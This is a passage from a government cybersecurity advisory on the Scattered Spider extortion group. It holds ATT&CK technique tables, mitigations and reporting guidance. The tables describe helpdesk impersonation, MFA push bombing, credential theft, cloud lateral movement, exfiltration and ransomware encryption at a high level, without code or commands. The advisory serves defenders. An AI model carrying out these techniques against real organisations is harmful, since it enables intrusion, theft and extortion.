Execution</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1648/\" title=\"Serverless Execution\">T1648</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors use ETL tools to collect data in cloud environments.</p>\n</td>\n</tr><tr><td>\n<p>User Execution</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1204/\" title=\"User Execution\">T1204</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors impersonating helpdesk personnel direct employees to run commercial remote access tools thereby enabling access to the victim’s network.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 8: Persistence</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Persistence</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/tactics/TA0003/\" title=\"Persistence\">TA0003</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors seek to maintain persistence on a targeted organization’s network.</p>\n</td>\n</tr><tr><td>\n<p>Create Account</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1136/\" title=\"Create Account\">T1136</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors create new user identities in the targeted organization.</p>\n</td>\n</tr><tr><td>\n<p>Modify Authentication Process: Multi-Factor Authentication</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1556/006/\" title=\"Modify Authentication Process: Multi-Factor Authentication\">T1556.006</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors may modify MFA tokens to gain access to a victim’s network.</p>\n</td>\n</tr><tr><td>\n<p>Valid Accounts</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors abuse and control valid accounts to maintain network access even when passwords are changed.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 9: Privilege Escalation</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Privilege Escalation</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/tactics/TA0004/\" title=\"Privilege Escalation\">TA0004</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors escalate account privileges when on a targeted organization’s network.</p>\n</td>\n</tr><tr><td>\n<p>Domain Policy Modification: Domain Trust Modification</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1484/002/\" title=\"Domain Policy Modification: Domain Trust Modification\">T1484.002</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors add a federated identify provider to the victim’s SSO tenant and activate automatic account linking.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 10: Defense Evasion</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Modify Cloud Compute Infrastructure: Create Cloud Instance</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1578/002/\" title=\"Modify Cloud Compute Infrastructure: Create Cloud Instance\">T1578.002</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors will create cloud instances for use during lateral movement and data collection.</p>\n</td>\n</tr><tr><td>\n<p>Impersonation</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1656/\" title=\"Impersonation\">TA1656</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors pose as company IT and/or helpdesk staff to gain access to victim’s networks.</p>\n<p>Scattered Spider threat actors use social engineering to convince IT help desk personnel to reset passwords and/or MFA tokens.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 11: Credential Access</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Credential Access</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/tactics/TA0006/\" title=\"Credential Access\">TA0006</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors use tools, such as Raccoon Stealer, to obtain login credentials.</p>\n</td>\n</tr><tr><td>\n<p>Forge Web Credentials</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1606/\" title=\"Forge Web Credentials\">T1606</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors may forge MFA tokens to gain access to a victim’s network.</p>\n</td>\n</tr><tr><td>\n<p>Multi-Factor Authentication Request Generation</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1621/\" title=\"Multi-Factor Authentication Request Generation\">T1621</a></p>\n</td>\n<td>\n<p>Scattered Spider sends repeated MFA notification prompts to lead employees to accept the prompt and gain access to the target network.</p>\n</td>\n</tr><tr><td>\n<p>Unsecured Credentials: Credentials in Files</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1552/001/\" title=\"Unsecured Credentials: Credentials in Files\">T1552.001</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors search for insecurely stored credentials on victim’s systems.</p>\n</td>\n</tr><tr><td>\n<p>Unsecured Credentials: Private Keys</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1552/004/\" title=\"Unsecured Credentials: Private Keys\">T1552.004</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors search for insecurely stored private keys on victim’s systems.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 12: Discovery</em></caption>\n<thead><tr><td>\n<p><strong>Technique Title</strong></p>\n</td>\n<td>\n<p><strong>ID</strong></p>\n</td>\n<td>\n<p><strong>Use</strong></p>\n</td>\n</tr></thead><tbody><tr><td>\n<p>Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/tactics/TA0007/\" title=\"Discovery\">TA0007</a></p>\n</td>\n<td>\n<p>Upon gaining access to a targeted network, Scattered Spider threat actors seek out SharePoint sites, credential storage documentation, VMware vCenter, infrastructure backups and enumerate AD to identify useful information to support further operations.</p>\n</td>\n</tr><tr><td>\n<p>Browser Information Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1217/\" title=\"Browser Information Discovery\">T1217</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors use tools (e.g., Raccoon Stealer) to obtain browser histories.</p>\n</td>\n</tr><tr><td>\n<p>Cloud Service Dashboard</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1538/\" title=\"Cloud Service Dashboard\">T1538</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors leverage AWS Systems Manager Inventory to discover targets for lateral movement.</p>\n</td>\n</tr><tr><td>\n<p>File and Directory Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1083/\" title=\"File and Directory Discovery\">T1083</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors search a compromised network to discover files and directories for further information or exploitation.</p>\n</td>\n</tr><tr><td>\n<p>Remote System Discovery</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors search for infrastructure, such as remote systems, to exploit.</p>\n</td>\n</tr><tr><td>\n<p>Steal Web Session Cookie</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1539/\" title=\"Steal Web Session Cookie\">T1539</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors use tools, such as Raccoon Stealer, to obtain browser cookies.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 13: Lateral Movement</em></caption>\n<thead><tr><td>\n<p><strong>Technique Title</strong></p>\n</td>\n<td>\n<p><strong>ID</strong></p>\n</td>\n<td>\n<p><strong>Use</strong></p>\n</td>\n</tr></thead><tbody><tr><td>\n<p>Lateral Movement</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/tactics/TA0008/\" title=\"Lateral Movement\">TA0008</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors laterally move across a target network upon gaining access and establishing persistence.</p>\n</td>\n</tr><tr><td>\n<p>Remote Services: Cloud Services</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1021/007/\" title=\"Remote Services: Cloud Services\">T1021.007</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors use pre-existing cloud instances for lateral movement and data collection.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 14: Collection</em></caption>\n<thead><tr><td>\n<p><strong>Technique Title</strong></p>\n</td>\n<td>\n<p><strong>ID</strong></p>\n</td>\n<td>\n<p><strong>Use</strong></p>\n</td>\n</tr></thead><tbody><tr><td>\n<p>Data from Information Repositories: Code Repositories</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1213/003/.003\" title=\"Data from Information Repositories: Code Repositories\">T1213.003</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors search code repositories for data collection and exfiltration.</p>\n</td>\n</tr><tr><td>\n<p>Data from Information Repositories: Sharepoint</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1213/002/\" title=\"Data from Information Repositories: Sharepoint\">T1213.002</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors search SharePoint repositories for information.</p>\n</td>\n</tr><tr><td>\n<p>Data Staged</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1074/\" title=\"Data Staged\">T1074</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors stage data from multiple data sources into a centralized database before exfiltration.</p>\n</td>\n</tr><tr><td>\n<p>Email Collection</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1114/\" title=\"Email Collection\">T1114</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors search victim’s emails to determine if the victim has detected the intrusion and initiated any security response.</p>\n</td>\n</tr><tr><td>\n<p>Data from Cloud Storage</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1530/\" title=\"Data from Cloud Storage\">T1530</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors search data in cloud storage for collection and exfiltration.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 15: Command and Control</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Remote Access Software</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1219/\" title=\"Remote Access Software\">T1219</a></p>\n</td>\n<td>\n<p>Impersonating helpdesk personnel, Scattered Spider threat actors direct employees to run commercial remote access tools thereby enabling access to and command and control of the victim’s network.</p>\n<p>Scattered Spider threat actors leverage third-party software to facilitate lateral movement and maintain persistence on a target organization’s network.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 16: Exfiltration</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Exfiltration</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/tactics/TA0010/\" title=\"Exfiltration\">TA0010</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors exfiltrate data from a target network to for data extortion.</p>\n</td>\n</tr></tbody></table><table class=\"Table tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap=\"\"><caption><em>Table 17: Impact</em></caption>\n<thead><tr><th scope=\"col\" role=\"columnheader\" data-tablesaw-priority=\"persist\">\n<p><strong>Technique Title</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>ID</strong></p>\n</th>\n<th scope=\"col\" role=\"columnheader\">\n<p><strong>Use</strong></p>\n</th>\n</tr></thead><tbody><tr><td>\n<p>Data Encrypted for Impact</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors recently began encrypting data on a target network and demanding a ransom for decryption.</p>\n<p>Scattered Spider threat actors has been observed encrypting VMware ESXi servers.</p>\n</td>\n</tr><tr><td>\n<p>Exfiltration Over Web Service: Exfiltration to Cloud Storage</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1567/002/\" title=\"Exfiltration Over Web Service: Exfiltration to Cloud Storage\">T1567.002</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors exfiltrate data to multiple sites including U.S.-based data centers and MEGA[.]NZ.</p>\n</td>\n</tr><tr><td>\n<p>Financial Theft</p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/versions/v14/techniques/T1657/\" title=\"Financial Theft\">T1657</a></p>\n</td>\n<td>\n<p>Scattered Spider threat actors monetized access to victim networks in numerous ways including extortion-enabled ransomware and data theft.</p>\n</td>\n</tr></tbody></table><h3><strong>MITIGATIONS</strong></h3>\n<p>These mitigations apply to all critical infrastructure organizations and network defenders. The FBI and CISA recommend that software manufactures incorporate secure-by-design and -default principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the secure posture for their customers.</p>\n<p>For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design and Default</a> webpage and <a href=\"https://www.cisa.gov/resources-tools/resources/secure-by-design-and-default\" title=\"Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software\">joint guide</a>.</p>\n<p>The FBI and CISA recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture based on the threat actor activity and to reduce the risk of compromise by Scattered Spider threat actors. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href=\"https://www.cisa.gov/cpg\" target=\"_blank\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>\n<ul><li><strong>Implement</strong><strong> application controls</strong> to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.</li>\n<li><strong>Reduce threat of malicious actors </strong>using remote access tools by:\n<ul><li><strong>Auditing remote access tools</strong> on your network to identify currently used and/or authorized software.</li>\n<li><strong>Reviewing logs for execution of remote access software</strong> to detect abnormal use of programs running as a portable executable [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.T</a><u>].</u></li>\n<li><strong>Using security software</strong> to detect instances of remote access software being loaded only in memory.</li>\n<li><strong>Requiring authorized remote access solutions</strong> to be used only from within your network over approved remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces (VDIs).</li>\n<li><strong>Blocking both inbound and outbound connections</strong> on common remote access software ports and protocols at the network perimeter.</li>\n<li><strong>Applying recommendations</strong> in the <a href=\"/sites/default/files/2023-06/Guide%20to%20Securing%20Remote%20Access%20Software_clean%20Final_508c.pdf\" title=\"Guide to Securing Remote Access Software\">Guide to Securing Remote Access Software</a>.</li>\n</ul></li>\n<li><strong>Implementing FIDO/WebAuthn authentication or Public Key Infrastructure (PKI)-based MFA</strong>. These MFA implementations are resistant to phishing and not suspectable to push bombing or SIM swap attacks, which are techniques known to be used by Scattered Spider actors. See CISA’s fact sheet <a href=\"/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"Implementing Phishing-Resistant MFA\">Implementing Phishing-Resistant MFA</a> for more information.</li>\n<li><strong>Strictly limit the use of Remote Desktop Protocol (RDP) and other remote desktop services</strong>. If RDP is necessary, rigorously apply best practices, for example [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.W</a>]:\n<ul><li>Audit the network for systems using RDP.</li>\n<li>Close unused RDP ports.</li>\n<li>Enforce account lockouts after a specified number of attempts.</li>\n<li><a href=\"/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"Implementing Phishing-Resistant MFA\">Apply phishing-resistant multifactor authentication (MFA)</a><u>.</u></li>\n<li>Log RDP login attempts.</li>\n</ul></li>\n</ul><p>In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:</p>\n<ul><li><strong>Implement a recovery plan</strong> to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).</li>\n<li><strong>Maintain offline backups of data </strong>and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.R</a>].</li>\n<li><strong>Require all accounts</strong> with password logins (e.g., service account, admin accounts, and domain admin accounts) <strong>to comply</strong> with <a href=\"https://pages.nist.gov/800-63-3/\">NIST's standards</a> for developing and managing password policies.\n<ul><li>Implement password policies in compliance with NIST’s standards.</li>\n<li>Use “strong” passwords that are unique and random, as well as contain at least sixteen characters and no more than 64 characters in length [<a href=\"https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\">CPG 2.B</a>].</li>\n<li>Consider implementing industry-recognized password managers that align with organizational technology procurement policies.</li>\n<li>Avoid reusing passwords [<a href=\"https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\">CPG 2.C</a>].</li>\n<li>Implement multiple failed login attempt account lockouts [<a href=\"https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\">CPG 2.G</a>].</li>\n<li>Disable password “hints.”</li>\n<li>Refrain from requiring recurring password changes.<br /><strong>Note:</strong> NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.</li>\n<li>Require administrator credentials to install software.</li>\n</ul></li>\n<li><strong>Require phishing-resistant multifactor authentication (MFA)</strong> for all services to the extent possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.H</a>].</li>\n<li><strong>Keep all operating systems, software, and firmware up to date.</strong> Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">known exploited vulnerabilities</a> in internet-facing systems [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 1.E</a>].</li>\n<li><strong>Segment networks</strong> to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.F</a>].</li>\n<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool.</strong> To aid in detecting the ransomware, implement a tool that logs and reports all network traffic and activity, including lateral movement, on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 3.A</a>].</li>\n<li><strong>Install, regularly update, and enable real time detection for antivirus software</strong> on all hosts.</li>\n<li><strong>Disable unused</strong> <strong>ports and protocols</strong> [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.V</a><u>].</u></li>\n<li><strong>Consider adding an email banner to emails</strong> received from outside your organization [<a href=\"/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\" title=\"Cross-Sector Cybersecurity Performance Goals March 2023 Update\">CPG 2.M</a>].</li>\n<li><strong>Disable hyperlinks</strong> in received emails.</li>\n<li><strong>Ensure all backup data is encrypted, immutable </strong>(i.e., ensure backup data cannot be altered or deleted), and covers the entire organization’s data infrastructure [<a href=\"https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf\">CPG 2.K, 2.L, 2.R</a>].</li>\n</ul><h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>\n<p>In addition to applying mitigations, the FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The FBI and CISA recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>\n<p>To get started:</p>\n<ol><li>Select an ATT&amp;CK technique described in this advisory (see Tables 4-17).</li>\n<li>Align your security technologies against the technique.</li>\n<li>Test your technologies against the technique.</li>\n<li>Analyze your detection and prevention technologies’ performance.</li>\n<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>\n<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>\n</ol><p>The FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>\n<h3><strong>REPORTING</strong></h3>\n<p>The FBI and CISA are seeking any information that can be shared, to include a sample ransom note, communications with Scattered Spider group actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a <a href=\"http://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI Field Office</a>, report the incident to the FBI Internet Crime Complaint Center (IC3) at <a href=\"https://www.ic3.gov/\" title=\"Internet Crime Complaint Center (IC3)\">IC3.gov</a>, or CISA via CISA’s 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or 888-282-0870).</p>\n<h3><strong>REFERENCES</strong></h3>\n<p>[1] <a href=\"https://attack.mitre.org/versions/v14/groups/G1015/\" title=\"Scattered Spider\">MITRE ATT&amp;CK – Scattered Spider</a><br />\n[2] <a href=\"https://www.trellix.com/en-us/about/newsroom/stories/research/scattered-spider-the-modus-operandi.html\" title=\"Scattered Spider: The Modus Operandi\">Trellix - Scattered Spider: The Modus Operandi</a><br />\n[3] <a href=\"https://www.crowdstrike.com/blog/analysis-of-intrusion-campaign-targeting-telecom-and-bpo-companies/\" title=\"Not a SIMulation: CrowdStrike Investigations Reveal Intrusion Campaign Targeting Telco and BPO Companies\">Crowdstrike - Not a SIMulation: CrowdStrike Investigations Reveal Intrusion Campaign Targeting Telco and BPO Companies</a><br />\n[4] <a href=\"https://www.crowdstrike.com/blog/scattered-spider-attempts-to-avoid-detection-with-bring-your-own-vulnerable-driver-tactic/\" title=\"SCATTERED SPIDER Exploits Windows Security Deficiencies with Bring-Your-Own-Vulnerable-Driver Tactic in Attempt to Bypass Endpoint Security\">Crowdstrike - SCATTERED SPIDER Exploits Windows Security Deficiencies with Bring-Your-Own-Vulnerable-Driver Tactic in Attempt to Bypass Endpoint Security</a><br />\n[5] <a href=\"https://www.malwarebytes.com/blog/personal/2023/09/ransomware-group-steps-up-issues-statement-over-mgm-resorts-compromise\" title=\"Ransomware group steps up, issues statement over MGM Resorts compromise\">Malwarebytes - Ransomware group steps up, issues statement over MGM Resorts compromise</a></p>\n<h3><strong>DISCLAIMER</strong></h3>\n<p>The information in this report is being provided “as is” for informational purposes only. The FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI and CISA.</p>\n<h3><strong>VERSION HISTORY</strong></h3>\n<p>November 16, 2023: Initial version.<br />\nNovember 21, 2023: Updated password recommendation language on page 12.</p>\n","pubDate":"Wed, 15 Nov 2023 09:55:52 EST","dc:creator":"CISA","guid":{"@isPermaLink":"false","#text":"/node/20328"}}]}}}